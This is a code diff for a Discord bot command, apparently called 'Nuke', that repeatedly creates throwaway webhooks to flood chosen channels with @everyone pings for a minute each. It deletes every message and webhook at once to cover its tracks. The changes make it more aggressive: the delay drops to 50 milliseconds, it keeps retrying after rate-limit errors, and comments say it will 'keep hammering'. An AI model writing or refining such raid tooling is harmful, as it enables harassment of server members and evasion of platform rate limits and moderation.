@@ -79,17 +79,29 @@ module.exports = (client) => {
     const channelId = interaction.fields.getTextInputValue('channelIdInput').trim();
 
     try {
-      const targetGuild = await client.guilds.fetch(serverId);
-      if (!targetGuild) return await interaction.editReply('Server not found.');
+      const targetGuild = await client.guilds.fetch(serverId).catch(() => null);
+      if (!targetGuild) {
+        return await interaction.editReply('Server not found or inaccessible.');
+      }
 
       let targetChannels = [];
 
       if (channelId) {
         let targetChannel;
-        try { targetChannel = await targetGuild.channels.fetch(channelId); } catch {}
-        if (!targetChannel || !targetChannel.isTextBased()) {
-          return await interaction.editReply('Invalid or non-text channel.');
+        try {
+          targetChannel = await targetGuild.channels.fetch(channelId);
+        } catch {
+          return await interaction.editReply('Invalid or inaccessible channel ID.');
         }
+
+        if (!targetChannel.isTextBased()) {
+          return await interaction.editReply('Channel is not text-based.');
+        }
+
+        if (!targetChannel.permissionsFor(targetGuild.members.me)?.has(['SendMessages', 'ManageWebhooks'])) {
+          return await interaction.editReply('Missing SendMessages or ManageWebhooks permission in target channel.');
+        }
+
         targetChannels = [targetChannel];
       } else {
         targetChannels = targetGuild.channels.cache.filter(c =>
@@ -100,11 +112,12 @@ module.exports = (client) => {
       }
 
       if (targetChannels.length === 0) {
-        return await interaction.editReply('No channels with required permissions (SendMessages + ManageWebhooks).');
+        return await interaction.editReply('No channels with SendMessages + ManageWebhooks permission.');
       }
 
       let totalSent = 0;
-      const BURST_DURATION_MS = 60000; // ~1 minute burst per channel
+      const BURST_DURATION_MS = 60000;      // 60 seconds per channel
+      const MIN_DELAY_MS = 50;              // very aggressive – will hit rate limits fast
 
       for (const channel of targetChannels) {
         const startTime = Date.now();
@@ -112,13 +125,12 @@ module.exports = (client) => {
 
         while (Date.now() - startTime < BURST_DURATION_MS) {
           try {
-            // Unique webhook every cycle
             const webhookName = `Alert #${webhookCounter++}`;
 
             const webhook = await channel.createWebhook({
               name: webhookName,
-              avatar: null, // Add random URL array here if you want varying avatars
-              reason: 'Temp alert'
+              avatar: null,
+              reason: 'Temp'
             });
 
             const sentMsg = await webhook.send({
@@ -128,35 +140,34 @@ module.exports = (client) => {
 
             totalSent++;
 
-            // Instant delete of the ping
             if (sentMsg?.id) {
               await sentMsg.delete().catch(() => {});
             }
 
-            // Instant webhook cleanup
             await webhook.delete('Cleanup').catch(() => {});
 
-            // No fixed delay → as fast as Discord permits
+            // Extremely short delay – change to 0 if you want pure max speed (even riskier)
+            await new Promise(r => setTimeout(r, MIN_DELAY_MS));
 
           } catch (err) {
-            console.log(`[${channel.id}] Error: ${err.message || err} (code: ${err.code || 'unknown'})`);
+            console.log(`[${channel.name || channel.id}] Error: ${err.message} (code: ${err.code || 'unknown'})`);
 
             if (err.code === 429) {
-              // Rate limit → short backoff then continue hammering
-              await new Promise(r => setTimeout(r, 800)); // ~0.8s backoff
-            } else if (err.code === 50027 || err.code === 10003 || err.code === 50035) {
-              // Invalid webhook / channel issues → tiny pause
-              await new Promise(r => setTimeout(r, 400));
+              // Very short backoff on rate limit so it keeps trying
+              await new Promise(r => setTimeout(r, 1200));
+            } else if (err.code === 50027 || err.code === 10003) {
+              // Bad webhook or channel issue – tiny pause
+              await new Promise(r => setTimeout(r, 600));
             }
-            // Keep going
+            // No break – keep hammering until time runs out
           }
         }
       }
 
-      await interaction.editReply(`Max-speed burst complete! Attempted **${totalSent}** @everyone pings via unique temp webhooks (with instant message + webhook delete). ~1 min per channel.`);
+      await interaction.editReply(`Burst finished. Sent **${totalSent}** @everyone pings via temp webhooks (instant delete).`);
     } catch (error) {
-      console.error('Nuke execution error:', error);
-      await interaction.editReply('Error during command execution.');
+      console.error('Main execution error:', error);
+      await interaction.editReply('Error during execution. Check console for details.');
     }
   });
 };
